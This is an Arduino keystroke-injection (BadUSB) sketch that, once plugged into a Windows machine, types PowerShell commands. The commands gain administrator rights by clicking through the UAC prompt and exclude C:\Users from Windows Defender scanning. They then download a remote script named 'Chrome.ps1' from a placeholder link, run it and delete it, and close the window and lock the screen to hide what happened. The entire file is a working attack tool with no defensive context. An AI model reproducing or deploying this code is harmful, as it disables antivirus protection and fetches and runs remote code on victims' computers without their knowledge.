#include <Keyboard.h> 

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  delay(1000);

  typeKey(KEY_LEFT_ESC);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ESC);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("powershell");

  delay(400);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("start-process PowerShell -verb runas");

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_LEFT_ARROW);

  delay(100);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("Set-MpPreference -ExclusionPath C:\\Users");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ESC);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("powershell");

  delay(400);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"CHROME.PS1 LINK HERE\",\"$env:USERPROFILE\\Chrome.ps1\")");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("./Chrome.ps1");

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.print("del Chrome.ps1");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(108);
  Keyboard.releaseAll();
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
